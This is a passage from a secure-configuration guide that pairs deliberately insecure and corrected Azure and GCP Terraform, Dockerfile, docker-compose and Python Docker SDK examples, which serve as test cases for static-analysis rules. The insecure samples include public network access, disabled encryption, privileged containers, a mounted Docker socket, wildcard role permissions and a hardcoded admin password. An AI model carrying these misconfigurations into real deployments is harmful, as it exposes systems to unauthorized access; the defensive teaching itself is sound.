    identity {
    type = "SystemAssigned"
    }
}

# ruleid: azure-aks-private-clusters-enabled
resource "azurerm_kubernetes_cluster" "example" {
    name                = "example-aks1"
    location            = azurerm_resource_group.example.location
    resource_group_name = azurerm_resource_group.example.name
    dns_prefix          = "exampleaks1"
    private_cluster_enabled = false

    default_node_pool {
    name       = "default"
    node_count = 1
    vm_size    = "Standard_D2_v2"
    }

    identity {
    type = "SystemAssigned"
    }
}
```

**Correct: Azure AKS - private cluster enabled**

```hcl
resource "azurerm_kubernetes_cluster" "example" {
name                = "example-aks1"
location            = azurerm_resource_group.example.location
resource_group_name = azurerm_resource_group.example.name
dns_prefix          = "exampleaks1"
private_cluster_enabled = true

default_node_pool {
    name       = "default"
    node_count = 1
    vm_size    = "Standard_D2_v2"
}

identity {
    type = "SystemAssigned"
}
}
```

**Incorrect: Azure AKS - no API server IP restrictions**

```hcl
# ruleid: azure-aks-apiserver-auth-ip-ranges
resource "azurerm_kubernetes_cluster" "default" {
  name                = "example"
  location            = "azurerm_resource_group.example.location"
  resource_group_name = "azurerm_resource_group.example.name"
  dns_prefix          = "example"

  default_node_pool {
    name       = "default"
    node_count = 1
    vm_size    = "Standard_D2_v2"
  }

  identity {
    type = "SystemAssigned"
  }
}

# ruleid: azure-aks-apiserver-auth-ip-ranges
resource "azurerm_kubernetes_cluster" "empty" {
  name                = "example"
  location            = "azurerm_resource_group.example.location"
  resource_group_name = "azurerm_resource_group.example.name"
  dns_prefix          = "example"

  default_node_pool {
    name       = "default"
    node_count = 1
    vm_size    = "Standard_D2_v2"
  }

  identity {
    type = "SystemAssigned"
  }

  api_server_authorized_ip_ranges = []
}
```

**Correct: Azure AKS - authorized IP ranges configured**

```hcl
resource "azurerm_kubernetes_cluster" "enabled" {
  name                = "example"
  location            = "azurerm_resource_group.example.location"
  resource_group_name = "azurerm_resource_group.example.name"
  dns_prefix          = "example"

  default_node_pool {
    name       = "default"
    node_count = 1
    vm_size    = "Standard_D2_v2"
  }

  identity {
    type = "SystemAssigned"
  }

  api_server_authorized_ip_ranges = ["192.168.0.0/16"]
}
```

**Incorrect: Azure AKS - no disk encryption set**

```hcl
# ruleid: azure-aks-uses-disk-encryptionset
resource "azurerm_kubernetes_cluster" "example" {
    name                = "example-aks1"
    location            = azurerm_resource_group.example.location
    resource_group_name = azurerm_resource_group.example.name
    dns_prefix          = "exampleaks1"

    default_node_pool {
    name       = "default"
    node_count = 1
    vm_size    = "Standard_D2_v2"
    }

    identity {
    type = "SystemAssigned"
    }
}
```

**Correct: Azure AKS - disk encryption set configured**

```hcl
resource "azurerm_kubernetes_cluster" "example" {
    name                = "example-aks1"
    location            = azurerm_resource_group.example.location
    resource_group_name = azurerm_resource_group.example.name
    dns_prefix          = "exampleaks1"
    disk_encryption_set_id = "someId"

    default_node_pool {
    name       = "default"
    node_count = 1
    vm_size    = "Standard_D2_v2"
    }

    identity {
    type = "SystemAssigned"
    }
}
```

**Incorrect: Azure Cosmos DB - public network access enabled**

```hcl
# ruleid: azure-cosmosdb-disables-public-network
resource "azurerm_cosmosdb_account" "db" {
    name                = "tfex-cosmos-db-${random_integer.ri.result}"
    location            = azurerm_resource_group.rg.location
    resource_group_name = azurerm_resource_group.rg.name
    offer_type          = "Standard"
    kind                = "GlobalDocumentDB"

    enable_automatic_failover = true

    consistency_policy {
    consistency_level       = "BoundedStaleness"
    max_interval_in_seconds = 10
    max_staleness_prefix    = 200
    }

    geo_location {
    location          = var.failover_location
    failover_priority = 1
    }

    geo_location {
    location          = azurerm_resource_group.rg.location
    failover_priority = 0
    }
}

# ruleid: azure-cosmosdb-disables-public-network
resource "azurerm_cosmosdb_account" "db" {
    name                = "tfex-cosmos-db-${random_integer.ri.result}"
    location            = azurerm_resource_group.rg.location
    resource_group_name = azurerm_resource_group.rg.name
    offer_type          = "Standard"
    kind                = "GlobalDocumentDB"

    public_network_access_enabled = true
    enable_automatic_failover = true

    consistency_policy {
      consistency_level       = "BoundedStaleness"
      max_interval_in_seconds = 10
      max_staleness_prefix    = 200
    }

    geo_location {
      location          = var.failover_location
      failover_priority = 1
    }

    geo_location {
      location          = azurerm_resource_group.rg.location
      failover_priority = 0
    }
}
```

**Correct: Azure Cosmos DB - public network access disabled**

```hcl
resource "azurerm_cosmosdb_account" "db" {
    name                = "tfex-cosmos-db-${random_integer.ri.result}"
    location            = azurerm_resource_group.rg.location
    resource_group_name = azurerm_resource_group.rg.name
    offer_type          = "Standard"
    kind                = "GlobalDocumentDB"

    public_network_access_enabled = false
    enable_automatic_failover = true

    consistency_policy {
      consistency_level       = "BoundedStaleness"
      max_interval_in_seconds = 10
      max_staleness_prefix    = 200
    }

    geo_location {
      location          = var.failover_location
      failover_priority = 1
    }

    geo_location {
      location          = azurerm_resource_group.rg.location
      failover_priority = 0
    }

    key_vault_key_id = "A versionless Key Vault Key ID for CMK encryption"
}
```

**Incorrect: Azure Cosmos DB - no customer-managed key**

```hcl
# ruleid: azure-cosmosdb-have-cmk
resource "azurerm_cosmosdb_account" "db" {
    name                = "tfex-cosmos-db-${random_integer.ri.result}"
    location            = azurerm_resource_group.rg.location
    resource_group_name = azurerm_resource_group.rg.name
    offer_type          = "Standard"
    kind                = "GlobalDocumentDB"

    enable_automatic_failover = true

    consistency_policy {
    consistency_level       = "BoundedStaleness"
    max_interval_in_seconds = 10
    max_staleness_prefix    = 200
    }

    geo_location {
    location          = var.failover_location
    failover_priority = 1
    }

    geo_location {
    location          = azurerm_resource_group.rg.location
    failover_priority = 0
    }
}
```

**Correct: Azure Cosmos DB - customer-managed key configured**

```hcl
resource "azurerm_cosmosdb_account" "db" {
    name                = "tfex-cosmos-db-${random_integer.ri.result}"
    location            = azurerm_resource_group.rg.location
    resource_group_name = azurerm_resource_group.rg.name
    offer_type          = "Standard"
    kind                = "GlobalDocumentDB"

    enable_automatic_failover = true

    consistency_policy {
      consistency_level       = "BoundedStaleness"
      max_interval_in_seconds = 10
      max_staleness_prefix    = 200
    }

    geo_location {
      location          = var.failover_location
      failover_priority = 1
    }

    geo_location {
      location          = azurerm_resource_group.rg.location
      failover_priority = 0
    }

    key_vault_key_id = "A versionless Key Vault Key ID for CMK encryption"
}
```

**Incorrect: Azure Redis - non-SSL port enabled**

```hcl
# ruleid: azure-redis-cache-enable-non-ssl-port
resource "azurerm_redis_cache" "example" {
    name                = "example-cache"
    location            = azurerm_resource_group.example.location
    resource_group_name = azurerm_resource_group.example.name
    capacity            = 2
    family              = "C"
    sku_name            = "Standard"
    enable_non_ssl_port = true
    minimum_tls_version = "1.2"
    public_network_access_enabled  = true
    redis_configuration {
    }
}
```

**Correct: Azure Redis - non-SSL port disabled**

```hcl
resource "azurerm_redis_cache" "example" {
    name                = "example-cache"
    location            = azurerm_resource_group.example.location
    resource_group_name = azurerm_resource_group.example.name
    capacity            = 2
    family              = "C"
    sku_name            = "Standard"
    enable_non_ssl_port = false
    minimum_tls_version = "1.2"
    public_network_access_enabled  = true

    redis_configuration {
    }
}
```

**Incorrect: Azure VM Scale Set - encryption at host disabled**

```hcl
# ruleid: azure-vmencryption-at-host-enabled
resource "azurerm_windows_virtual_machine_scale_set" "example" {
    name                = "example-vmss"
    resource_group_name = azurerm_resource_group.example.name
    location            = azurerm_resource_group.example.location
    sku                 = "Standard_F2"
    instances           = 1
    admin_password      = "P@55w0rd1234!"
    admin_username      = "adminuser"

    source_image_reference {
    publisher = "MicrosoftWindowsServer"
    offer     = "WindowsServer"
    sku       = "2016-Datacenter-Server-Core"
    version   = "latest"
    }

    os_disk {
    storage_account_type = "Standard_LRS"
    caching              = "ReadWrite"
    }

    network_interface {
    name    = "example"
    primary = true

    ip_configuration {
        name      = "internal"
        primary   = true
        subnet_id = azurerm_subnet.internal.id
    }
    }
}

# ruleid: azure-vmencryption-at-host-enabled
resource "azurerm_linux_virtual_machine_scale_set" "example" {
    name                = "example-vmss"
    resource_group_name = azurerm_resource_group.example.name
    location            = azurerm_resource_group.example.location
    sku                 = "Standard_F2"
    instances           = 1
    admin_password      = "P@55w0rd1234!"
    admin_username      = "adminuser"
    encryption_at_host_enabled = false

    source_image_reference {
    publisher = "MicrosoftWindowsServer"
    offer     = "WindowsServer"
    sku       = "2016-Datacenter-Server-Core"
    version   = "latest"
    }

    os_disk {
    storage_account_type = "Standard_LRS"
    caching              = "ReadWrite"
    }

    network_interface {
    name    = "example"
    primary = true

    ip_configuration {
        name      = "internal"
        primary   = true
        subnet_id = azurerm_subnet.internal.id
    }
    }
}
```

**Correct: Azure VM Scale Set - encryption at host enabled**

```hcl
resource "azurerm_windows_virtual_machine_scale_set" "example" {
    name                = "example-vmss"
    resource_group_name = azurerm_resource_group.example.name
    location            = azurerm_resource_group.example.location
    sku                 = "Standard_F2"
    instances           = 1
    admin_password      = "P@55w0rd1234!"
    admin_username      = "adminuser"
    encryption_at_host_enabled = true

    source_image_reference {
    publisher = "MicrosoftWindowsServer"
    offer     = "WindowsServer"
    sku       = "2016-Datacenter-Server-Core"
    version   = "latest"
    }

    os_disk {
    storage_account_type = "Standard_LRS"
    caching              = "ReadWrite"
    }

    network_interface {
    name    = "example"
    primary = true

    ip_configuration {
        name      = "internal"
        primary   = true
        subnet_id = azurerm_subnet.internal.id
    }
    }
}
```

**Incorrect: Azure Linux VM Scale Set - password authentication enabled**

```hcl
# ruleid: azure-scale-set-password
resource "azurerm_linux_virtual_machine_scale_set" "example" {
    name                = var.scaleset_name
    resource_group_name = var.resource_group.name
    location            = var.resource_group.location
    sku                 = var.sku
    instances           = var.instance_count
    admin_username      = var.admin_username
    disable_password_authentication = false
    tags = var.common_tags
}
```

**Correct: Azure Linux VM Scale Set - SSH key authentication**

```hcl
resource "azurerm_linux_virtual_machine_scale_set" "example" {
    name                = var.scaleset_name
    resource_group_name = var.resource_group.name
    location            = var.resource_group.location
    sku                 = var.sku
    instances           = var.instance_count
    admin_username      = var.admin_username
    disable_password_authentication = true

    admin_ssh_key {
        username   = var.admin_username
        public_key = tls_private_key.new.public_key_pem
    }
    tags = var.common_tags
}
```

**Incorrect: Azure Managed Disk - encryption disabled**

```hcl
# ruleid: azure-managed-disk-encryption
resource "azurerm_managed_disk" "fail" {
  name                 = var.disk_name
  location             = var.location
  resource_group_name  = var.resource_group_name
  storage_account_type = var.storage_account_type
  create_option        = "Empty"
  disk_size_gb         = var.disk_size_gb
  encryption_settings {
    enabled = false
  }
  tags = var.common_tags
}
```

**Correct: Azure Managed Disk - encryption enabled**

```hcl
resource "azurerm_managed_disk" "pass2" {
  name                 = var.disk_name
  location             = var.location
  resource_group_name  = var.resource_group_name
  storage_account_type = var.storage_account_type
  create_option        = "Empty"
  disk_size_gb         = var.disk_size_gb
  encryption_settings {
    enabled = true
  }
  tags = var.common_tags
}

resource "azurerm_managed_disk" "pass" {
  name                   = "acctestmd1"
  location               = "West US 2"
  resource_group_name    = azurerm_resource_group.example.name
  storage_account_type   = "Standard_LRS"
  create_option          = "Empty"
  disk_size_gb           = "1"
  disk_encryption_set_id = var.encryption_set_id

  tags = {
    environment = "staging"
  }
}
```

**Incorrect: Azure Container Group - no virtual network**

```hcl
# ruleid: azure-containergroup-deployed-into-virtualnetwork
resource "azurerm_container_group" "example" {
    name                = "example-continst"
    location            = azurerm_resource_group.example.location
    resource_group_name = azurerm_resource_group.example.name
    ip_address_type     = "public"
    dns_name_label      = "aci-label"
    os_type             = "Linux"

    container {
    name   = "hello-world"
    image  = "microsoft/aci-helloworld:latest"
    cpu    = "0.5"
    memory = "1.5"

    ports {
        port     = 443
        protocol = "TCP"
    }
    }

    container {
    name   = "sidecar"
    image  = "microsoft/aci-tutorial-sidecar"
    cpu    = "0.5"
    memory = "1.5"
    }
}
```

**Correct: Azure Container Group - deployed into virtual network**

```hcl
resource "azurerm_container_group" "example" {
    name                = "example-continst"
    location            = azurerm_resource_group.example.location
    resource_group_name = azurerm_resource_group.example.name
    ip_address_type     = "public"
    dns_name_label      = "aci-label"
    os_type             = "Linux"

    container {
    name   = "hello-world"
    image  = "microsoft/aci-helloworld:latest"
    cpu    = "0.5"
    memory = "1.5"

    ports {
        port     = 443
        protocol = "TCP"
    }
    }

    container {
    name   = "sidecar"
    image  = "microsoft/aci-tutorial-sidecar"
    cpu    = "0.5"
    memory = "1.5"
    }

    network_profile_id = "network_profile_id"
}
```

**Incorrect: Azure Data Factory - public network access enabled**

```hcl
# ruleid: azure-datafactory-no-public-network-access
resource "azurerm_data_factory" "example" {
    name                = "example"
    location            = "azurerm_resource_group.example.location"
    resource_group_name = "azurerm_resource_group.example.name"
}

# ruleid: azure-datafactory-no-public-network-access
resource "azurerm_data_factory" "example" {
    name                = "example"
    location            = "azurerm_resource_group.example.location"
    resource_group_name = "azurerm_resource_group.example.name"
    public_network_enabled = true
}
```

**Correct: Azure Data Factory - public network access disabled**

```hcl
resource "azurerm_data_factory" "example" {
    name                = "example"
    location            = "azurerm_resource_group.example.location"
    resource_group_name = "azurerm_resource_group.example.name"
    public_network_enabled = false
}
```

**Incorrect: Azure Data Lake Store - encryption disabled**

```hcl
# ruleid: azure-datalake-store-encryption
resource "azurerm_data_lake_store" "example" {
    name                = "consumptiondatalake"
    location            = azurerm_resource_group.example.location
    resource_group_name = azurerm_resource_group.example.name

    encryption_state = "Disabled"
}

# ruleid: azure-datalake-store-encryption
resource "azurerm_data_lake_store" "example" {
    name                = "consumptiondatalake"
    location            = azurerm_resource_group.example.location
    resource_group_name = azurerm_resource_group.example.name
}
```

**Correct: Azure Data Lake Store - encryption enabled**

```hcl
resource "azurerm_data_lake_store" "example" {
    name                = "consumptiondatalake"
    location            = azurerm_resource_group.example.location
    resource_group_name = azurerm_resource_group.example.name

    encryption_state = "Enabled"
}
```

**Incorrect: Azure IoT Hub - public network access enabled**

```hcl
# ruleid: azure-iot-no-public-network-access
resource "azurerm_iothub" "example" {
    name                = "Example-IoTHub"
    resource_group_name = azurerm_resource_group.example.name
    location            = azurerm_resource_group.example.location

    sku {
    name     = "S1"
    capacity = "1"
    }

    endpoint {
    type                       = "AzureIotHub.StorageContainer"
    connection_string          = azurerm_storage_account.example.primary_blob_connection_string
    name                       = "export"
    batch_frequency_in_seconds = 60
    max_chunk_size_in_bytes    = 10485760
    container_name             = azurerm_storage_container.example.name
    encoding                   = "Avro"
    file_name_format           = "{iothub}/{partition}_{YYYY}_{MM}_{DD}_{HH}_{mm}"
    }

    public_network_access_enabled = true
}
```

**Correct: Azure IoT Hub - public network access disabled**

```hcl
resource "azurerm_iothub" "example" {
    name                = "Example-IoTHub"
    resource_group_name = azurerm_resource_group.example.name
    location            = azurerm_resource_group.example.location

    sku {
    name     = "S1"
    capacity = "1"
    }

    endpoint {
    type                       = "AzureIotHub.StorageContainer"
    connection_string          = azurerm_storage_account.example.primary_blob_connection_string
    name                       = "export"
    batch_frequency_in_seconds = 60
    max_chunk_size_in_bytes    = 10485760
    container_name             = azurerm_storage_container.example.name
    encoding                   = "Avro"
    file_name_format           = "{iothub}/{partition}_{YYYY}_{MM}_{DD}_{HH}_{mm}"
    }

    public_network_access_enabled = false
}
```

**Incorrect: Azure Event Grid - public network access enabled**

```hcl
# ruleid: azure-eventgrid-domain-network-access
resource "azurerm_eventgrid_domain" "example" {
    name                = "example-app-service"
    location            = azurerm_resource_group.example.location
    resource_group_name = azurerm_resource_group.example.name
}

# ruleid: azure-eventgrid-domain-network-access
resource "azurerm_eventgrid_domain" "example" {
    name                = "example-app-service"
    location            = azurerm_resource_group.example.location
    resource_group_name = azurerm_resource_group.example.name

    public_network_access_enabled = true
}
```

**Correct: Azure Event Grid - public network access disabled**

```hcl
resource "azurerm_eventgrid_domain" "example" {
    name                = "example-app-service"
    location            = azurerm_resource_group.example.location
    resource_group_name = azurerm_resource_group.example.name

    public_network_access_enabled = false
}
```

**Incorrect: Azure Cognitive Services - public network access enabled**

```hcl
# ruleid: azure-cognitiveservices-disables-public-network
resource "azurerm_cognitive_account" "examplea" {
  name                = "example-account"
  location            = var.resource_group.location
  resource_group_name = var.resource_group.name
  kind                = "Face"
  public_network_access_enabled = true
  sku_name = "S0"
}

# ruleid: azure-cognitiveservices-disables-public-network
resource "azurerm_cognitive_account" "examplea" {
  name                = "example-account"
  location            = var.resource_group.location
  resource_group_name = var.resource_group.name
  kind                = "Face"
  sku_name = "S0"
}
```

**Correct: Azure Cognitive Services - public network access disabled**

```hcl
resource "azurerm_cognitive_account" "examplea" {
  name                = "example-account"
  location            = var.resource_group.location
  resource_group_name = var.resource_group.name
  kind                = "Face"
  public_network_access_enabled = false
  sku_name = "S0"
}
```

**Incorrect: Azure Search - public network access enabled**

```hcl
# ruleid: azure-search-publicnetwork-access-disabled
resource "azurerm_search_service" "example" {
    name                = "example-search-service"
    resource_group_name = azurerm_resource_group.example.name
    location            = azurerm_resource_group.example.location
    sku                 = "standard"
    public_network_access_enabled = true
}

# ruleid: azure-search-publicnetwork-access-disabled
resource "azurerm_search_service" "example" {
    name                = "example-search-service"
    resource_group_name = azurerm_resource_group.example.name
    location            = azurerm_resource_group.example.location
    sku                 = "standard"
}
```

**Correct: Azure Search - public network access disabled**

```hcl
resource "azurerm_search_service" "example" {
    name                = "example-search-service"
    resource_group_name = azurerm_resource_group.example.name
    location            = azurerm_resource_group.example.location
    sku                 = "standard"
    public_network_access_enabled = false
}
```

**Incorrect: Azure API Management - no virtual network**

```hcl
# ruleid: azure-apiservices-use-virtualnetwork
resource "azurerm_api_management" "example" {
    name                = "example-apim"
    location            = azurerm_resource_group.example.location
    resource_group_name = azurerm_resource_group.example.name
    publisher_name      = "My Company"
    publisher_email     = "company@terraform.io"

    sku_name = "Developer_1"

    policy {
    xml_content = <<XML
    <policies>
        <inbound />
        <backend />
        <outbound />
        <on-error />
    </policies>
XML

    }
}
```

**Correct: Azure API Management - virtual network configured**

```hcl
resource "azurerm_api_management" "example" {
    name                = "example-apim"
    location            = azurerm_resource_group.example.location
    resource_group_name = azurerm_resource_group.example.name
    publisher_name      = "My Company"
    publisher_email     = "company@terraform.io"

    sku_name = "Developer_1"
    virtual_network_configuration {
    subnet_id = azure_subnet.subnet_not_public_ip.id
    }
    policy {
    xml_content = <<XML
    <policies>
        <inbound />
        <backend />
        <outbound />
        <on-error />
    </policies>
XML

    }
}
```

**Incorrect: Azure IAM - custom role with wildcard actions**

```hcl
resource "azurerm_role_definition" "example" {
    name        = "my-custom-role"
    scope       = data.azurerm_subscription.primary.id
    description = "This is a custom role created via Terraform"

    permissions {
    # ruleid: azure-customrole-definition-subscription-owner
    actions     = ["*"]
    not_actions = []
    }

    assignable_scopes = [
    data.azurerm_subscription.primary.id
    ]
}
```

**Correct: Azure IAM - custom role with specific permissions**

```hcl
resource "azurerm_role_definition" "example" {
    name        = "my-custom-role"
    scope       = data.azurerm_subscription.primary.id
    description = "This is a custom role created via Terraform"

    permissions {
    actions     = [
    "Microsoft.Authorization/*/read",
        "Microsoft.Insights/alertRules/*",
        "Microsoft.Resources/deployments/write",
        "Microsoft.Resources/subscriptions/operationresults/read",
        "Microsoft.Resources/subscriptions/read",
        "Microsoft.Resources/subscriptions/resourceGroups/read",
        "Microsoft.Support/*"
        ]
    not_actions = []
    }

    assignable_scopes = [
    data.azurerm_subscription.primary.id
    ]
}
```

### 0.23 Secure Docker Configurations

**Impact: HIGH**

This guide provides security best practices for Dockerfiles and docker-compose configurations. Following these patterns helps prevent container escapes, privilege escalation, and other security vulnerabilities in containerized environments.

**Incorrect: Dockerfile - last user is root**

```dockerfile
FROM busybox

RUN git clone https://github.com/returntocorp/semgrep
RUN pip3 install semgrep
RUN semgrep -f p/xss
USER swuser
USER root

USER user1
# ruleid: last-user-is-root
USER root
```

The last user in the container should not be 'root'. If an attacker gains control of the container, they will have root access.

**Correct: Dockerfile - last user is non-root**

```dockerfile
FROM busybox

RUN git clone https://github.com/returntocorp/semgrep
RUN pip3 install semgrep
USER root
RUN apt-get update && apt-get install -y some-package
USER appuser
```

**Incorrect: Dockerfile - missing image version**

```dockerfile
# ruleid: missing-image-version
FROM debian

# ruleid: missing-image-version
FROM nixos/nix

# ruleid: missing-image-version
FROM debian AS blah

# ruleid: missing-image-version
FROM nixos/nix AS build

# ruleid: missing-image-version
FROM --platform=linux/amd64 debian

# ruleid: missing-image-version
FROM --platform=linux/amd64 debian as name
```

Images should be tagged with an explicit version to produce deterministic container builds.

**Correct: Dockerfile - explicit image version**

```dockerfile
# ok: missing-image-version
FROM debian:jessie

# ok: missing-image-version
FROM nixos/nix:2.7.0

# ok: missing-image-version
FROM debian:jessie AS blah

# ok: missing-image-version
FROM nixos/nix:2.7.0 AS build

# ok: missing-image-version
FROM --platform=linux/amd64 debian:jessie

# ok: missing-image-version
FROM --platform=linux/amd64 debian:jessie as name

# ok: missing-image-version
FROM python:3.10.1-alpine3.15@sha256:4be65b406f7402b5c4fd5df7173d2fd7ea3fdaa74d9c43b6ebd896197a45c448

# ok: missing-image-version
FROM python@sha256:4be65b406f7402b5c4fd5df7173d2fd7ea3fdaa74d9c43b6ebd896197a45c448

# ok: missing-image-version
FROM scratch
```

**Incorrect: Dockerfile - using latest tag**

```dockerfile
# ruleid: avoid-latest-version
FROM debian:latest

# ruleid: avoid-latest-version
FROM myregistry.local/testing/test-image:latest

# ruleid: avoid-latest-version
FROM debian:latest as blah

# ruleid: avoid-latest-version
FROM myregistry.local/testing/test-image:latest as blah
```

The 'latest' tag may change the base container without warning, producing non-deterministic builds.

**Correct: Dockerfile - specific version tag**

```dockerfile
# ok: avoid-latest-version
FROM debian:jessie

# ok: avoid-latest-version
FROM myregistry.local/testing/test-image:42ee222

# ok: avoid-latest-version
FROM debian:jessie as blah2

# ok: avoid-latest-version
FROM myregistry.local/testing/test-image:2a4af68 as blah2
```

**Incorrect: Dockerfile - relative WORKDIR**

```dockerfile
FROM busybox

# ruleid: use-absolute-workdir
WORKDIR usr/src/app

ENV dirpath=bar
# ruleid: use-absolute-workdir
WORKDIR ${dirpath}
```

Use absolute paths for WORKDIR to prevent issues based on assumptions about the WORKDIR of previous containers.

**Correct: Dockerfile - absolute WORKDIR**

```dockerfile
FROM busybox

# ok: use-absolute-workdir
WORKDIR /usr/src/app

ENV dirpath=/bar
# ok: use-absolute-workdir
WORKDIR ${dirpath}
```

**Incorrect: Dockerfile - using ADD for remote files**

```dockerfile
FROM busybox

# ruleid: prefer-copy-over-add
ADD http://foo bar

# ruleid: prefer-copy-over-add
ADD https://foo bar

# ruleid: prefer-copy-over-add
ADD foo.tar.gz bar

# ruleid: prefer-copy-over-add
ADD foo.bz2 bar
```

ADD will accept and include files from URLs and automatically extract archives. This potentially exposes the container to man-in-the-middle attacks. Use COPY instead for local files.

**Correct: Dockerfile - using COPY or ADD for local files**

```dockerfile
FROM busybox

# ok: prefer-copy-over-add
ADD foo bar

# ok: prefer-copy-over-add
ADD foo* /mydir/

# ok: prefer-copy-over-add
ADD hom?.txt /mydir/o

# ok: prefer-copy-over-add
ADD arr[[]0].txt /mydir/o

# ok: prefer-copy-over-add
ADD --chown=55:mygroup files* /somedir/

# ok: prefer-copy-over-add
ADD --chown=bin files* /somedir/
```

**Incorrect: Dockerfile - using RUN cd**

```dockerfile
FROM busybox

# ruleid: use-workdir
RUN cd semgrep && git clone https://github.com/returntocorp/semgrep
```

Use 'WORKDIR' instead of 'RUN cd ...' for improved clarity and reliability. 'RUN cd ...' may not work as expected in a container.

**Correct: Dockerfile - using WORKDIR**

```dockerfile
FROM busybox

# ok: use-workdir
RUN pip3 install semgrep && cd ..

# ok: use-workdir
RUN semgrep -f p/xss

# ok: use-workdir
RUN blah

# ok: use-workdir
RUN blah blahcd
```

**Incorrect: Dockerfile - using apt-get upgrade**

```dockerfile
FROM debian

# ruleid:avoid-apt-get-upgrade
RUN apt-get update && apt-get upgrade

# ruleid:avoid-apt-get-upgrade
RUN apt-get update && apt-get upgrade -y

# ruleid:avoid-apt-get-upgrade
RUN apt-get update && apt-get dist-upgrade

# ruleid:avoid-apt-get-upgrade
RUN apt-get upgrade
```

Packages in base containers should be up-to-date, removing the need to upgrade or dist-upgrade. If a package is out of date, contact the maintainers.

**Correct: Dockerfile - only updating package lists**

```dockerfile
FROM debian

# ok: avoid-apt-get-upgrade
RUN apt-get update
```

**Incorrect: Dockerfile - nonsensical commands**

```dockerfile
FROM busybox

# ruleid: nonsensical-command
RUN top

# ruleid: nonsensical-command
RUN kill 1234

# ruleid: nonsensical-command
RUN ifconfig

# ruleid: nonsensical-command
RUN ps -ef

# ruleid: nonsensical-command
RUN vim /var/log/www/error.log
```

Some commands do not make sense in a container and should not be used. These include: shutdown, service, ps, free, top, kill, mount, ifconfig, nano, vim.

**Correct: Dockerfile - appropriate container commands**

```dockerfile
FROM busybox

# ok: nonsensical-command
RUN git clone https://github.com/returntocorp/semgrep

# ok: nonsensical-command
RUN pip3 install semgrep

# ok: nonsensical-command
RUN semgrep -f p/xss
```

**Incorrect: Dockerfile - using --platform with FROM**

```dockerfile
# ruleid: avoid-platform-with-from
FROM --platform=x86 busybox

# ruleid: avoid-platform-with-from
FROM --platform=x86 busybox:1.34

# ruleid: avoid-platform-with-from
FROM --platform=x86 busybox AS bb

# ruleid: avoid-platform-with-from
FROM --platform=x86 busybox:1.34 AS bb
```

Using '--platform' with FROM restricts the image to build on a single platform. Use 'docker buildx --platform=' instead for multi-platform builds.

**Correct: Dockerfile - FROM without platform restriction**

```dockerfile
# ok: avoid-platform-with-from
FROM busybox

# ok: avoid-platform-with-from
FROM busybox:1.34

# ok: avoid-platform-with-from
FROM busybox AS bb

# ok: avoid-platform-with-from
FROM busybox:1.34 AS bb
```

**Incorrect: Docker Compose - privileged service**

```yaml
version: "3.9"
services:
  # ok: privileged-service
  web:
    image: nginx:alpine
  worker:
    image: my-worker-image:latest
    # ruleid:privileged-service
    privileged: true
  # ok: privileged-service
  db:
    image: mysql
```

Running containers in privileged mode grants the container the equivalent of root capabilities on the host machine. This can lead to container escapes, privilege escalation, and other security concerns.

**Correct: Docker Compose - service without privileged mode**

```yaml
version: "3.9"
services:
  web:
    image: nginx:alpine
  worker:
    image: my-worker-image:latest
    privileged: false
  db:
    image: mysql
```

**Incorrect: Docker Compose - writable filesystem**

```yaml
version: "3.9"
services:
  # ruleid: writable-filesystem-service
  web:
    image: nginx:alpine
  # ruleid: writable-filesystem-service
  worker:
    image: my-worker-image:latest
    read_only: false
```

Services running with a writable root filesystem may allow malicious applications to download and run additional payloads, or modify container files. Use read-only filesystems when possible.

**Correct: Docker Compose - read-only filesystem**

```yaml
version: "3.9"
services:
  # ok: writable-filesystem-service
  db:
    image: mysql
    read_only: true
```

**Incorrect: Docker Compose - exposing Docker socket**

```yaml
version: "3.9"
services:
  service02:
    image: my-worker-image:latest
    # ruleid: exposing-docker-socket-volume
    volumes:
      - /tmp/foo:/tmp/foo
      - /var/run/docker.sock:/var/run/docker.sock
  service05:
    image: ubuntu
    # ruleid: exposing-docker-socket-volume
    volumes:
      - /tmp/foo:/tmp/foo
      - /run/docker.sock:/run/docker.sock
  service14:
    image: redis:6
    # ruleid: exposing-docker-socket-volume
    volumes:
      - /var/run/docker.sock
  service22:
    image: debian:bullseye
    # ruleid: exposing-docker-socket-volume
    volumes:
      - source: /var/run/docker.sock
  service23:
    image: debian:buster
    # ruleid: exposing-docker-socket-volume
    volumes:
      - source: /var/run/docker.sock
        target: /var/run/docker.sock
```

Exposing the host's Docker socket to containers via a volume is equivalent to giving unrestricted root access to your host. Never expose the Docker socket unless absolutely necessary.

**Correct: Docker Compose - no Docker socket exposure**

```yaml
version: "3.9"
services:
  service01:
    image: nginx:alpine
    # ok: exposing-docker-socket-volume
    volumes:
      - /tmp/foo:/tmp/foo
      - /tmp/bar:/tmp/bar
  service28:
    image: mysql:latest
    # ok: exposing-docker-socket-volume
    volumes:
      - source: /tmp/foo
  service29:
    image: postgres:latest
    # ok: exposing-docker-socket-volume
    volumes:
      - source: /tmp/foo
        target: /tmp/bar
      - source: /tmp/bar
        target: /tmp/foo
```

**Incorrect: Python Docker SDK - arbitrary container run**

```python
import docker
client = docker.from_env()

def bad1(user_input):
    # ruleid: docker-arbitrary-container-run
    client.containers.run(user_input, 'echo hello world')

def bad2(user_input):
    # ruleid: docker-arbitrary-container-run
    client.containers.create(user_input, 'echo hello world')
```

If unverified user data can reach the `run` or `create` method, it can result in running arbitrary containers.

**Correct: Python Docker SDK - hardcoded container image**

```python
import docker
client = docker.from_env()

def ok1():
    # ok: docker-arbitrary-container-run
    client.containers.run("alpine", 'echo hello world')

def ok2():
    # ok: docker-arbitrary-container-run
    client.containers.create("alpine", 'echo hello world')
```

### 0.24 Secure GCP Terraform Configurations

**Impact: HIGH**

This guide provides secure configuration patterns for Google Cloud Platform (GCP) resources using Terraform. Following these best practices helps prevent misconfigurations that could lead to data exposure, unauthorized access, or compliance violations.

---

Uniform bucket-level access simplifies permission management by disabling object ACLs and using only IAM for access control.

**Incorrect: uniform bucket-level access disabled or not set**

```hcl
# ruleid: gcp-storage-bucket-uniform-access
resource "google_storage_bucket" "default" {
  name     = "example.com"
  location = "EU"
}

# ruleid: gcp-storage-bucket-uniform-access
resource "google_storage_bucket" "disabled" {
  name     = "example"
  location = "EU"
  uniform_bucket_level_access = false
}
```

**Correct: uniform bucket-level access enabled**

```hcl
# ok: gcp-storage-bucket-uniform-access
resource "google_storage_bucket" "enabled" {
  name     = "example"
  location = "EU"
  uniform_bucket_level_access = true
}
```

CWE-284: Improper Access Control

---

Access logging helps with security auditing and compliance by tracking bucket access.

**Incorrect: logging not configured**

```hcl
# ruleid: gcp-cloud-storage-logging
resource "google_storage_bucket" "fail" {
    name     = "jgwloggingbucket"
    location = var.location
    uniform_bucket_level_access = true
}
```

**Correct: logging configured**

```hcl
